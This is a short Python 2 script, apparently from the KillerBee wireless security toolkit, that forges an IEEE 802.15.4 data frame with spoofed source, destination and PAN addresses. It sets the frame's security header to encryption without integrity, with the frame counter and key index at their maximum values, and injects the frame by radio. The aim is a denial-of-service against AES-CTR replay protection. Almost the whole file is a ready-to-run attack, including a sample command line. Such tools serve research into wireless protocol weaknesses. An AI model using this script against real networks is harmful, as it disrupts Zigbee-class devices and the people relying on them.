#!/usr/bin/env python

import argparse
from random import randint

from killerbee import getKillerBee
from scapy.all import Dot15d4, Dot15d4Data

# Command line main function
#  clear; sudo python dos_aesctr_replay.py -c 26 -s 3c63 -d 800a -p 1234
if __name__=='__main__':
    # Command-line arguments
    parser = argparse.ArgumentParser()
    tohex = lambda s: int(s.replace(':', ''), 16)
    parser.add_argument('-f', '--channel', '-c', action='store', dest='channel', required=True, type=int, default=11)
    #parser.add_argument('-i', '--interface', action='store', dest='devstring', default=None)
    parser.add_argument('-p', '--panid', action='store', required=True, type=tohex)
    parser.add_argument('-s', '--source', action='store', required=True, type=tohex)
    parser.add_argument('-d', '--destination', action='store', required=True, type=tohex)
    parser.add_argument('-q', '--seqnum', action='store', default=200, type=int)
    args = parser.parse_args()

    kb = getKillerBee(args.channel)

    scapy = Dot15d4(fcf_frametype="Data")/Dot15d4Data()
    scapy.seqnum = (args.seqnum + randint(1, 10)) % 255
    scapy.src_addr = args.source
    scapy.dest_addr = args.destination
    scapy.src_panid = scapy.dest_panid = args.panid
    print "DoSing packets from sender 0x%04x to destination 0x%04x." % (scapy.src_addr, scapy.dest_addr)

    # Weaponize this frame for the DoS Attack on AES-CTR
    scapy.fcf_security = True
    sechdrtemp = scapy.aux_sec_header #TODO oddly having issue w/ doing directly to main Dot15d4
    sechdrtemp.sec_sc_seclevel = "ENC"       #confidentiality but no integrity
    sechdrtemp.sec_framecounter = 0xFFFFFFFF #max value
    sechdrtemp.sec_sc_keyidmode = "1oKeyIndex" 
    sechdrtemp.sec_keyid_keyindex = 0xFF     #max value
    scapy.aux_sec_header = sechdrtemp

    # Output and send frame
    scapy.show2()
    print "Sending forged frame:", str(scapy).encode('hex')
    kb.inject(str(scapy))
